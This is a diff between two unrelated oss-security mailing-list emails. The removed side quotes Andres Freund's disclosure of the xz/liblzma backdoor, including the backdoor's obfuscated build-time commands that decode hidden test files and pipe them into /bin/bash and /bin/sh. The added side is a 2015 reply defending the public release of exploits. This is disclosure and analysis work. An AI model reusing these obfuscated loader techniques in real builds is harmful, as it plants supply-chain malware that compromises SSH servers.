@@ -1,4 +1,9 @@
-Received: (qmail 7797 invoked by uid 550); 29 Mar 2024 17:32:59 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7725" "Friday" "24" "July" "2015" "14:15:46" "+0200" "Martino Dell'Ambrogio" "tillo@tillo.ch" "<55B22C72.4020706@tillo.ch>" "153" "Re: [oss-security] Qualys Security Advisory - CVE-2015-3245 userhelper - CVE-2015-3246 libuser" nil nil nil "7" "2015072412:15:46" "[oss-security] Qualys Security Advisory - CVE-2015-3245 userhelper - CVE-2015-3246 libuser" (number mark "        tillo@tillo. Jul 24  153/7725  " thread-indent "\"Re: [oss-security] Qualys Security Advisory - CVE-2015-3245 userhelper - CVE-2015-3246 libuser\"\n") "<871tfxdgzw.fsf@lysator.liu.se>" ("<20150723170954.GA17931@localhost.localdomain>" "<87h9oud89s.fsf@lysator.liu.se>" "<CAHQ_-nR8WGDK58PmsmhPp8ApnmwjrLRxeyCKTsfRL83ZUZjTxA@mail.gmail.com>" "<871tfxdgzw.fsf@lysator.liu.se>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 15890 invoked by uid 550); 24 Jul 2015 12:16:00 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,474 +11,175 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 13525 invoked from network); 29 Mar 2024 16:24:25 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=codemonkey-ws.20230601.gappssmtp.com; s=20230601; t=1711729748; x=1712334548; darn=lists.openwall.com;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :from:to:cc:subject:date:message-id:reply-to;
-        bh=gXtwKt+kVO2TeyKSLI9B++qty5jJt27GCACviik1ic0=;
-        b=Mww6A0aMLh2lEynoS3PMaTjvPWT7vbBRF9BiQdwZ7Gb2Qy1iFbLlMc3dg7d41XPKDS
-         aVgAcS5ju0uIxuSO9/NOlPgSy+D20sNSY+xApMzf5sX5ITWEocRZq0xqaDAY604E52W3
-         Ij8+xtqC8hia8lFEDgKioX36+cuEeUkoEkRbPdcD81pJIS0v3RYT8gW/SDc+7Fx/DkXS
-         1qAMZXNFu5o83BWCktCuAECIaJDOXimN3V+C3FYmqghefOYg7RENB8a7cWYTJxS5HRQR
-         OptqUxWzGOilG1bEyfBBozReQxewQCDj6qkfb6AbM4RG6GYOgsIWmbmjB6ZjLYVux8NZ
-         09uQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1711729748; x=1712334548;
-        h=to:subject:message-id:date:from:in-reply-to:references:mime-version
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
-        bh=gXtwKt+kVO2TeyKSLI9B++qty5jJt27GCACviik1ic0=;
-        b=IQTbQ8u/50jatJa8VVesWVvXjAlHnnD1MX1IECaSB9Pw+nJcWBqlr19fhmyNGaqwQb
-         rbH+RHYJRQ37Z9umToOGyPkUsbE560F2wJ/d0foXsPHtxpdYHh8qRlCv+VpbGSvZF3wy
-         L3RT8KPGF7Kgd3HsSSW6migihJBgkTtwv2K9dMfuJ5/FyHlYMM4NVD+hUMHClFSVrbV2
-         UoIezLPfnRD2yWBZSvf3UnSZHSYYZV6aQgKJvfpRvUfy5JWAUtKJEDbVQpp7gJm1CkvE
-         kiEZRzfivV8JDHG4IqcbR/g48pMUUqoDK3WOry3V2Db/TOI/lxqjI3yyjXNSv5f6BNhR
-         N53g==
-X-Gm-Message-State: AOJu0Yw1mzsJE4j5k05k7U86QMYHOK15HKogWeiNMzz3Kq4WPdXeE/+4
-	eVIz7QsUjPr51MA9mEeVr4uITDQ7Pcu+bvRdYoP8zHLTs8NtZfKcs75cZbxWC8BHKxvvyzCPLan
-	sUM2lYA+TBk9MFLF2n3JOStPV2zQyUwU3AodyYfNcW17+hi4=
-X-Google-Smtp-Source: AGHT+IHS8q2LiXd4EyL0JVwq34fzpd+hO8oRDD6cqlkWJjQ0A4tGOckxgQG3ymwftGWcYeEXiOGPrR1UMR0w+A9BSuY=
-X-Received: by 2002:a2e:a233:0:b0:2d6:a33c:66f8 with SMTP id
- i19-20020a2ea233000000b002d6a33c66f8mr1433940ljm.4.1711729747874; Fri, 29 Mar
- 2024 09:29:07 -0700 (PDT)
+Received: (qmail 15872 invoked from network); 24 Jul 2015 12:16:00 -0000
+Message-ID: <55B22C72.4020706@tillo.ch>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Thunderbird/31.8.0
 MIME-Version: 1.0
-References: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de> <CAFRnB2UB4p9JHzq_PdibFUHvZdyjF-65Bj2kGuy5ZpG8JtOrNg@mail.gmail.com>
-In-Reply-To: <CAFRnB2UB4p9JHzq_PdibFUHvZdyjF-65Bj2kGuy5ZpG8JtOrNg@mail.gmail.com>
-From: Anthony Liguori <anthony@codemonkey.ws>
-Date: Fri, 29 Mar 2024 09:28:58 -0700
-Message-ID: <CA+aC4ku4Gkk3m0OHTr8nveHuxhW1bbh5GniaGxC_ahLMFm0k+g@mail.gmail.com>
+References: <20150723170954.GA17931@localhost.localdomain>	<87h9oud89s.fsf@lysator.liu.se>	<CAHQ_-nR8WGDK58PmsmhPp8ApnmwjrLRxeyCKTsfRL83ZUZjTxA@mail.gmail.com> <871tfxdgzw.fsf@lysator.liu.se>
+In-Reply-To: <871tfxdgzw.fsf@lysator.liu.se>
+Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg=sha1; boundary="------------ms030807030609030107050502"
+X-Assp-Version: 2.4.5(15162) on assp.leg.tillo.ch
+X-Assp-ID: assp.leg.tillo.ch m1-40148-02217
+X-Assp-Session: 7FE7B5C82F30 (mail 1)
+X-Assp-Client-SSL: yes
+X-Assp-Server-TLS: yes
+Date: Fri, 24 Jul 2015 14:15:46 +0200
+From: Martino Dell'Ambrogio <tillo@tillo.ch>
+Reply-To: oss-security@lists.openwall.com
+Subject: Re: [oss-security] Qualys Security Advisory - CVE-2015-3245 userhelper
+ - CVE-2015-3246 libuser
 To: oss-security@lists.openwall.com
-Content-Type: multipart/alternative; boundary="00000000000092f32e0614cf23b7"
-Subject: Re: [oss-security] backdoor in upstream xz/liblzma leading to ssh
- server compromise
 
---00000000000092f32e0614cf23b7
-Content-Type: text/plain; charset="UTF-8"
+--------------ms030807030609030107050502
+Content-Type: text/plain; charset=utf-8
 Content-Transfer-Encoding: quoted-printable
 
-I would not trust any content from tukanni.org including older tarballs.
-
-The malicious individual has access to the signing key clearly and could
-modify older tarballs easily.
-
-Regards,
-
-Anthony Liguori
-
-On Fri, Mar 29, 2024, 9:18=E2=80=AFAM Alex Gaynor <alex.gaynor@gmail.com> w=
-rote:
-
-> Hi Andres,
+On 07/24/2015 11:47 AM, Leif Nixon wrote:
+> [...]
 >
-> Thanks for writing this up. Just to make sure I understand the action
-> item here: folks who are building their own xz, should switch to a
-> release prior to 5.6.0, as those are the only ones known to be
-> unaffected?
+> As I see it, there are two reasons for releasing working exploits
+> without warning;
 >
-> Alex
+> 1) Forcing the hand of a non-responsive vendor,
 >
-> On Fri, Mar 29, 2024 at 12:10=E2=80=AFPM Andres Freund <andres@anarazel.d=
-e> wrote:
-> >
-> > Hi,
-> >
-> > After observing a few odd symptoms around liblzma (part of the xz
-> package) on
-> > Debian sid installations over the last weeks (logins with ssh taking a
-> lot of
-> > CPU, valgrind errors) I figured out the answer:
-> >
-> > The upstream xz repository and the xz tarballs have been backdoored.
-> >
-> > At first I thought this was a compromise of debian's package, but it
-> turns out
-> > to be upstream.
-> >
-> >
-> > =3D=3D Compromised Release Tarball =3D=3D
-> >
-> > One portion of the backdoor is *solely in the distributed tarballs*. For
-> > easier reference, here's a link to debian's import of the tarball, but
-> it is
-> > also present in the tarballs for 5.6.0 and 5.6.1:
-> >
-> >
-> https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-=
-to-host.m4?ref_type=3Dheads#L63
-> >
-> > That line is *not* in the upstream source of build-to-host, nor is
-> > build-to-host used by xz in git.  However, it is present in the tarballs
-> > released upstream, except for the "source code" links, which I think
-> github
-> > generates directly from the repository contents:
-> >
-> > https://github.com/tukaani-project/xz/releases/tag/v5.6.0
-> > https://github.com/tukaani-project/xz/releases/tag/v5.6.1
-> >
-> >
-> > This injects an obfuscated script to be executed at the end of
-> configure. This
-> > script is fairly obfuscated and data from "test" .xz files in the
-> repository.
-> >
-> >
-> > This script is executed and, if some preconditions match, modifies
-> > $builddir/src/liblzma/Makefile to contain
-> >
-> > am__test =3D bad-3-corrupt_lzma2.xz
-> > ...
-> > am__test_dir=3D$(top_srcdir)/tests/files/$(am__test)
-> > ...
-> > sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
-> >
-> >
-> > which ends up as
-> > ...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "
-> \-_" "         _\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
-> >
-> > Leaving out the "| bash" that produces
-> >
-> > ####Hello####
-> > #=EF=BF=BD=EF=BF=BDZ=EF=BF=BD.hj=EF=BF=BD
-> > eval `grep ^srcdir=3D config.status`
-> > if test -f ../../config.status;then
-> > eval `grep ^srcdir=3D ../../config.status`
-> > srcdir=3D"../../$srcdir"
-> > fi
-> > export i=3D"((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1=
-024
-> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +20=
-48
-> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
-> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +20=
-48
-> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
-> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +20=
-48
-> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
-> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +20=
-48
-> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
-> >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +20=
-48
-> && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024
-> >/dev/null) && head -c +724)";(xz -dc
-> $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr
-> "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw
-> --lzma1 -dc|/bin/sh
-> > ####World####
-> >
-> > After de-obfuscation this leads to the attached injected.txt.
-> >
-> >
-> > =3D=3D Compromised Repository =3D=3D
-> >
-> > The files containing the bulk of the exploit are in an obfuscated form =
-in
-> >   tests/files/bad-3-corrupt_lzma2.xz
-> >   tests/files/good-large_compressed.lzma
-> > committed upstream. They were initially added in
-> >
-> https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10=
-f71e274f63c0
-> >
-> > Note that the files were not even used for any "tests" in 5.6.0.
-> >
-> >
-> > Subsequently the injected code (more about that below) caused valgrind
-> errors
-> > and crashes in some configurations, due the stack layout differing from
-> what
-> > the backdoor was expecting.  These issues were attempted to be worked
-> around
-> > in 5.6.1:
-> >
-> >
-> https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702=
-d4f7298788ad
-> >
-> https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f=
-1eb7cf64175f
-> >
-> https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0=
-ba078e7ade92
-> >
-> > For which the exploit code was then adjusted:
-> >
-> https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce4628=
-9a3ff72a7b89
-> >
-> > Given the activity over several weeks, the committer is either directly
-> > involved or there was some quite severe compromise of their
-> > system. Unfortunately the latter looks like the less likely explanation,
-> given
-> > they communicated on various lists about the "fixes" mentioned above.
-> >
-> >
-> > Florian Weimer first extracted the injected code in isolation, also
-> attached,
-> > liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
-> >
-> >
-> > =3D=3D Affected Systems =3D=3D
-> >
-> > The attached de-obfuscated script is invoked first after configure,
-> where it
-> > decides whether to modify the build process to inject the code.
-> >
-> > These conditions include targeting only x86-64 linux:
-> >     if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo
-> "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
-> >
-> > Building with gcc and the gnu linker
-> >     if test "x$GCC" !=3D 'xyes' > /dev/null 2>&1;then
-> >     exit 0
-> >     fi
-> >     if test "x$CC" !=3D 'xgcc' > /dev/null 2>&1;then
-> >     exit 0
-> >     fi
-> >     LDv=3D$LD" -v"
-> >     if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
-> >     exit 0
-> >
-> > Running as part of a debian or RPM package build:
-> >     if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" =3D
-> "xx86_64";then
-> >
-> > Particularly the latter is likely aimed at making it harder to reproduce
-> the
-> > issue for investigators.
-> >
-> >
-> > Due to the working of the injected code (see below), it is likely the
-> backdoor
-> > can only work on glibc based systems.
-> >
-> >
-> > Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
-> > distributions, and where they have, mostly in pre-release versions.
-> >
-> >
-> > =3D=3D Observing Impact on openssh server =3D=3D
-> >
-> > With the backdoored liblzma installed, logins via ssh become a lot
-> slower.
-> >
-> > time ssh nonexistant@localhost
-> >
-> > before:
-> > nonexistant@localhost: Permission denied (publickey).
-> >
-> > before:
-> > real    0m0.299s
-> > user    0m0.202s
-> > sys     0m0.006s
-> >
-> > after:
-> > nonexistant@localhost: Permission denied (publickey).
-> >
-> > real    0m0.807s
-> > user    0m0.202s
-> > sys     0m0.006s
-> >
-> >
-> > openssh does not directly use liblzma. However debian and several other
-> > distributions patch openssh to support systemd notification, and
-> libsystemd
-> > does depend on lzma.
-> >
-> >
-> > Initially starting sshd outside of systemd did not show the slowdown,
-> despite
-> > the backdoor briefly getting invoked. This appears to be part of some
-> > countermeasures to make analysis harder.
-> >
-> > Observed requirements for the exploit:
-> > a) TERM environment variable is not set
-> > b) argv[0] needs to be /usr/sbin/sshd
-> > c) LD_DEBUG, LD_PROFILE are not set
-> > d) LANG needs to be set
-> > e) Some debugging environments, like rr, appear to be detected. Plain g=
-db
-> >    appears to be detected in some situations, but not others
-> >
-> > To reproduce outside of systemd, the server can be started with a clear
-> > environment, setting only the required variable:
-> >
-> > env -i LANG=3Den_US.UTF-8 /usr/sbin/sshd -D
-> >
-> >
-> > In fact, openssh does not need to be started as a server to observe the
-> > slowdown:
-> >
-> > slow:
-> > env -i LANG=3DC /usr/sbin/sshd -h
-> >
-> > (about 0.5s on my older system)
-> >
-> >
-> > fast:
-> > env -i LANG=3DC TERM=3Dfoo /usr/sbin/sshd -h
-> > env -i LANG=3DC LD_DEBUG=3Dstatistics /usr/sbin/sshd -h
-> > ...
-> >
-> > (about 0.01s on the same system)
-> >
-> >
-> > It's possible that argv[0] other /usr/sbin/sshd also would have effect -
-> there
-> > are obviously lots of servers linking to libsystemd.
-> >
-> >
-> > =3D=3D Analyzing the injected code =3D=3D
-> >
-> > I am *not* a security researcher, nor a reverse engineer.  There's lots
-> of
-> > stuff I have not analyzed and most of what I observed is purely from
-> > observation rather than exhaustively analyzing the backdoor code.
-> >
-> > To analyze I primarily used "perf record -e intel_pt//ub" to observe
-> where
-> > execution diverges between the backdoor being active and not. Then also
-> gdb,
-> > setting breakpoints before the divergence.
-> >
-> >
-> > The backdoor initially intercepts execution by replacing the ifunc
-> resolvers
-> > crc32_resolve(), crc64_resolve() with different code, which calls
-> > _get_cpuid(), injected into the code (which previously would just be
-> static
-> > inline functions).  In xz 5.6.1 the backdoor was further obfuscated,
-> removing
-> > symbol names.
-> >
-> > These functions get resolved during startup, because sshd is built with
-> > -Wl,-z,now, leading to all symbols being resolved early. If started with
-> > LD_BIND_NOT=3D1 the backdoor does not appear to work.
-> >
-> >
-> > Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
-> > 'completed' variable is 0 and increments it, returning the normal cpuid
-> result
-> > (via a new _cpuid()). It gets to be more interesting during
-> crc64_resolve().
-> >
-> > In the second invocation crc64_resolve() appears to find various
-> information,
-> > like data from the dynamic linker, program arguments and environment.
-> Then it
-> > perform various environment checks, including those above. There are
-> other
-> > checks I have not fully traced.
-> >
-> > If the above decides to continue, the code appears to be parsing the
-> symbol
-> > tables in memory. This is the quite slow step that made me look into the
-> issue.
-> >
-> >
-> > Notably liblzma's symbols are resolved before many of the other
-> libraries,
-> > including the symbols in the main sshd binary.  This is important becau=
-se
-> > symbols are resolved, the GOT gets remapped read-only thanks to
-> -Wl,-z,relro.
-> >
-> >
-> > To be able to resolve symbols in libraries that have not yet loaded, the
-> > backdoor installs an audit hook into the dynamic linker, which can be
-> observed
-> > with gdb using
-> >   watch _rtld_global_ro._dl_naudit
-> > It looks like the audit hook is only installed for the main binary.
-> >
-> > That hook gets called, from _dl_audit_symbind, for numerous symbols in
-> the
-> > main binary. It appears to wait for "RSA_public_decrypt@got.plt" to be
-> > resolved.  When called for that symbol, the backdoor changes the value =
-of
-> > RSA_public_decrypt@got.plt to point to its own code.  It does not do
-> this via
-> > the audit hook mechanism, but outside of it.
-> >
-> > For reasons I do not yet understand, it does change sym.st_value *and*
-> the
-> > return value of from the audit hook to a different value, which leads
-> > _dl_audit_symbind() to do nothing - why change anything at all then?
-> >
-> > After that the audit hook is uninstalled again.
-> >
-> > It is possible to change the got.plt contents at this stage because it
-> has not
-> > (and can't yet) been remapped to be read-only.
-> >
-> >
-> > I suspect there might be further changes performed at this stage.
-> >
-> >
-> > =3D=3D Impact on sshd =3D=3D
-> >
-> > The prior section explains that RSA_public_decrypt@got.plt was
-> redirected to
-> > point into the backdoor code. The trace I was analyzing indeed shows th=
-at
-> > during a pubkey login the exploit code is invoked:
-> >
-> >             sshd 1736357 [010] 714318.734008:          1  branches:uH:
->     5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =3D>     555555561=
-2d0
-> RSA_public_decrypt@plt+0x0 (/usr/sbin/sshd)
-> >
-> > The backdoor then calls back into libcrypto, presumably to perform
-> normal authentication
-> >
-> >             sshd 1736357 [010] 714318.734009:          1  branches:uH:
->     7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =
-=3D>
->    7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.=
-3)
-> >
-> >
-> > I have not yet analyzed precisely what is being checked for in the
-> injected
-> > code, to allow unauthorized access. Since this is running in a
-> > pre-authentication context, it seems likely to allow some form of access
-> or
-> > other form of remote code execution.
-> >
-> > I'd upgrade any potentially vulnerable system ASAP.
-> >
-> >
-> > =3D=3D Bug reports =3D=3D
-> >
-> > Given the apparent upstream involvement I have not reported an upstream
-> > bug. As I initially thought it was a debian specific issue, I sent a mo=
-re
-> > preliminary report to security@debian.org.  Subsequently I reported the
-> issue
-> > to distros@. CISA was notified by a distribution.
-> >
-> > Red Hat assigned this issue CVE-2024-3094.
-> >
-> >
-> > =3D=3D Detecting if installation is vulnerable =3D=3D
-> >
-> > Vegard Nossum wrote a script to detect if it's likely that the ssh
-> binary on a
-> > system is vulnerable, attached here. Thanks!
-> >
-> >
-> > Greetings,
-> >
-> > Andres Freund
+> 2) Stroking a weak ego by showing off. (Or for marketing, but that comes
+>    to the same thing.)
 >
+> Except for case 1, releasing a working exploit *does not help anybody*
+> except the kiddies. If there are other reasons, I'd like to be told
+> about them.
 >
->
-> --
-> All that is necessary for evil to succeed is for good people to do nothin=
-g.
+> If Qualys had released a slightly less detailed advisory, or even just
+> left off the actual exploit, and given users a day or two to patch their
+> systems before going full disclosure, the risk to innocent bystanders
+> would have been much reduced.
 >
 
---00000000000092f32e0614cf23b7--
+Actually, releasing a working exploit helps our customers more often
+than not.
+In professional pentesting, proof of exploitation is essential.
+Most often than not, a real attacker will invest time and resources into
+a working exploit, the customer will not feel the need to invest into it
+just for simulation.
+
+Moreover, as soon as systems can be patched, they should be.
+Of course a few hours delay is not realistic, but I want to be sure that
+everyone understands how much "releasing a working exploit *does not
+help anybody*" is false.
+
+I urge researchers to continue to release their exploits into the public
+domain.
+Do it "responsibly", maybe get help in order to do it correctly, but do
+it, because it's beneficial more than harmful to any potential target.
+
+--=20
+Martino Dell'Ambrogio
+Security Auditor
+Web: http://www.tillo.ch/
+Email: tillo@tillo.ch
+
+
+
+--------------ms030807030609030107050502
+Content-Type: application/pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="smime.p7s"
+Content-Description: S/MIME Cryptographic Signature
+
+MIAGCSqGSIb3DQEHAqCAMIACAQExCzAJBgUrDgMCGgUAMIAGCSqGSIb3DQEH
+AQAAoIIMbzCCBjMwggUboAMCAQICAwvLTzANBgkqhkiG9w0BAQUFADCBjDEL
+MAkGA1UEBhMCSUwxFjAUBgNVBAoTDVN0YXJ0Q29tIEx0ZC4xKzApBgNVBAsT
+IlNlY3VyZSBEaWdpdGFsIENlcnRpZmljYXRlIFNpZ25pbmcxODA2BgNVBAMT
+L1N0YXJ0Q29tIENsYXNzIDEgUHJpbWFyeSBJbnRlcm1lZGlhdGUgQ2xpZW50
+IENBMB4XDTE0MTEwNDIyMTM1MloXDTE1MTEwNTEzMjI0OVowUzEZMBcGA1UE
+DRMQUjFBMThPZVNFZE9qY1QzazEXMBUGA1UEAwwOdGlsbG9AdGlsbG8uY2gx
+HTAbBgkqhkiG9w0BCQEWDnRpbGxvQHRpbGxvLmNoMIIBIjANBgkqhkiG9w0B
+AQEFAAOCAQ8AMIIBCgKCAQEAwavxpU4/3yVbwngBDmm5Z5rVx+7QgYuX9qDE
+EGFPtnqC507dkSqYat+d8pFjeRU1Bv9I22E1xspm4+pfvyvc6XZz7phqHLE7
+Reb+1CPr9frnPtd28p1HxfOyrLompctj87CQUiqgIkR/k0Qjjkei9SVSZQrP
+PteysckuxGyx6O0x/ILufq2fLBREtFLTwLUj8Nra0+q0CjWqK1U/CQrakhLZ
+KfR+ooePr7HZ1akMxToBOenPgaq/uvEAPUmGetp8FpEg1HBpBvxcyzArC1Kt
+OW+1jjtCS8zHdxFX0iwLQusH1i9HURWeXjwggvKTWASvrFqihWDsqPB5v1Oh
+WTBbWwIDAQABo4IC1DCCAtAwCQYDVR0TBAIwADALBgNVHQ8EBAMCBLAwHQYD
+VR0lBBYwFAYIKwYBBQUHAwIGCCsGAQUFBwMEMB0GA1UdDgQWBBTXiNoA33sj
+s+oH0GX75OntEdw73zAfBgNVHSMEGDAWgBRTcu2SnODaywFcfH6WNU7y1LhR
+gjAZBgNVHREEEjAQgQ50aWxsb0B0aWxsby5jaDCCAUwGA1UdIASCAUMwggE/
+MIIBOwYLKwYBBAGBtTcBAgMwggEqMC4GCCsGAQUFBwIBFiJodHRwOi8vd3d3
+LnN0YXJ0c3NsLmNvbS9wb2xpY3kucGRmMIH3BggrBgEFBQcCAjCB6jAnFiBT
+dGFydENvbSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTADAgEBGoG+VGhpcyBj
+ZXJ0aWZpY2F0ZSB3YXMgaXNzdWVkIGFjY29yZGluZyB0byB0aGUgQ2xhc3Mg
+MSBWYWxpZGF0aW9uIHJlcXVpcmVtZW50cyBvZiB0aGUgU3RhcnRDb20gQ0Eg
+cG9saWN5LCByZWxpYW5jZSBvbmx5IGZvciB0aGUgaW50ZW5kZWQgcHVycG9z
+ZSBpbiBjb21wbGlhbmNlIG9mIHRoZSByZWx5aW5nIHBhcnR5IG9ibGlnYXRp
+b25zLjA2BgNVHR8ELzAtMCugKaAnhiVodHRwOi8vY3JsLnN0YXJ0c3NsLmNv
+bS9jcnR1MS1jcmwuY3JsMIGOBggrBgEFBQcBAQSBgTB/MDkGCCsGAQUFBzAB
+hi1odHRwOi8vb2NzcC5zdGFydHNzbC5jb20vc3ViL2NsYXNzMS9jbGllbnQv
+Y2EwQgYIKwYBBQUHMAKGNmh0dHA6Ly9haWEuc3RhcnRzc2wuY29tL2NlcnRz
+L3N1Yi5jbGFzczEuY2xpZW50LmNhLmNydDAjBgNVHRIEHDAahhhodHRwOi8v
+d3d3LnN0YXJ0c3NsLmNvbS8wDQYJKoZIhvcNAQEFBQADggEBAKXkFCUU59xd
+KmbzrDxbFRmP4oPgG1Up8xe+mwPCjarg3GQwhvCYp20R4pEPDrgDIEn9EnW4
+ZlG8RYVV2V33wI+ulWseW5L73Dp3AfbGDKg4rBqCgCxQGFH0wTP9XLI7M3Sa
+vjFKB0O8+5gJw8VJwSoMK6p/nVCT6UMo78AWpEpki/UIsmSmU1zVL0546XK4
+0SvcBjny9fUFN03xA3jmLSuO9pl6QcH9Dy1m9R60+UrfmyzwJKpFTJNU+gJU
+f9i5tHvqBFQUGQhXobc4NOg42HbB4teanegM8Rbbo4unQ2aUJx6PP+iGzsNy
+EZRkup+yaT9L9QuwV1epFVYsnyMX6egwggY0MIIEHKADAgECAgEeMA0GCSqG
+SIb3DQEBBQUAMH0xCzAJBgNVBAYTAklMMRYwFAYDVQQKEw1TdGFydENvbSBM
+dGQuMSswKQYDVQQLEyJTZWN1cmUgRGlnaXRhbCBDZXJ0aWZpY2F0ZSBTaWdu
+aW5nMSkwJwYDVQQDEyBTdGFydENvbSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
+eTAeFw0wNzEwMjQyMTAxNTVaFw0xNzEwMjQyMTAxNTVaMIGMMQswCQYDVQQG
+EwJJTDEWMBQGA1UEChMNU3RhcnRDb20gTHRkLjErMCkGA1UECxMiU2VjdXJl
+IERpZ2l0YWwgQ2VydGlmaWNhdGUgU2lnbmluZzE4MDYGA1UEAxMvU3RhcnRD
+b20gQ2xhc3MgMSBQcmltYXJ5IEludGVybWVkaWF0ZSBDbGllbnQgQ0EwggEi
+MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDHCYPMzi3YGrEppC4Tq5a+
+ijKDjKaIQZZVR63UbxIP6uq/I0fhCu+cQhoUfE6ERKKnu8zPf1Jwuk0tsvVC
+k6U9b+0UjM0dLep3ZdE1gblK/1FwYT5Pipsu2yOMluLqwvsuz9/9f1+1PKHG
+/FaR/wpbfuIqu54qzHDYeqiUfsYzoVflR80DAC7hmJ+SmZnNTWyUGHJbBpA8
+Q89lGxahNvuryGaC/o2/ceD2uYDX9U8Eg5DpIpGQdcbQeGarV04WgAUjjXX5
+r/2dabmtxWMZwhZna//jdiSyrrSMTGKkDiXm6/3/4ebfeZuCYKzN2P8O2F/X
+e2AC/Y7zeEsnR7FOp+uXAgMBAAGjggGtMIIBqTAPBgNVHRMBAf8EBTADAQH/
+MA4GA1UdDwEB/wQEAwIBBjAdBgNVHQ4EFgQUU3Ltkpzg2ssBXHx+ljVO8tS4
+UYIwHwYDVR0jBBgwFoAUTgvvGqRAW6UXaYcwyjRoQ9BBrvIwZgYIKwYBBQUH
+AQEEWjBYMCcGCCsGAQUFBzABhhtodHRwOi8vb2NzcC5zdGFydHNzbC5jb20v
+Y2EwLQYIKwYBBQUHMAKGIWh0dHA6Ly93d3cuc3RhcnRzc2wuY29tL3Nmc2Nh
+LmNydDBbBgNVHR8EVDBSMCegJaAjhiFodHRwOi8vd3d3LnN0YXJ0c3NsLmNv
+bS9zZnNjYS5jcmwwJ6AloCOGIWh0dHA6Ly9jcmwuc3RhcnRzc2wuY29tL3Nm
+c2NhLmNybDCBgAYDVR0gBHkwdzB1BgsrBgEEAYG1NwECATBmMC4GCCsGAQUF
+BwIBFiJodHRwOi8vd3d3LnN0YXJ0c3NsLmNvbS9wb2xpY3kucGRmMDQGCCsG
+AQUFBwIBFihodHRwOi8vd3d3LnN0YXJ0c3NsLmNvbS9pbnRlcm1lZGlhdGUu
+cGRmMA0GCSqGSIb3DQEBBQUAA4ICAQAKgwh9eKssBly4Y4xerhy5I3dNoXHY
+fYa8PlVLL/qtXnkFgdtY1o95CfegFJTwqBBmf8pyTUnFsukDFUI22zF5bVHz
+uJ+GxhnSqN2sD1qetbYwBYK2iyYA5Pg7Er1A+hKMIzEzcduRkIMmCeUTyMyi
+kfbUFvIBivtvkR8ZFAk22BZy+pJfAoedO61HTz4qSfQoCRcLN5A0t4DkuVhT
+MXIzuQ8CnykhExD6x4e6ebIbrjZLb7L+ocR0y4YjCl/Pd4MXU91y0vTipgr/
+O75CDUHDRHCCKBVmz/Rzkc/b970MEeHt5LC3NiWTgBSvrLEuVzBKM586YoRD
+9Dy3OHQgWI270g+5MYA8GfgI/EPT5G7xPbCDz+zjdH89PeR3U4So4lSXur6H
+6vp+m9TQXPF3a0LwZrp8MQ+Z77U1uL7TelWO5lApsbAonrqASfTpaprFVkL4
+nyGH+NHST2ZJPWIBk81i6Vw0ny0qZW2Niy/QvVNKbb43A43ny076khXO7cNb
+BIRdJ/6qQNq9Bqb5C0Q5nEsFcj75oxQRqlKf6TcvGbjxkJh8BYtv9ePsXklA
